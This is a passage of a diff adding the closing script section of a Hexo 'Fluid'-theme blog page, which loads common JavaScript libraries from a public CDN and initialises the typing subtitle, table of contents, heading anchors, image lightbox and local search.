+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
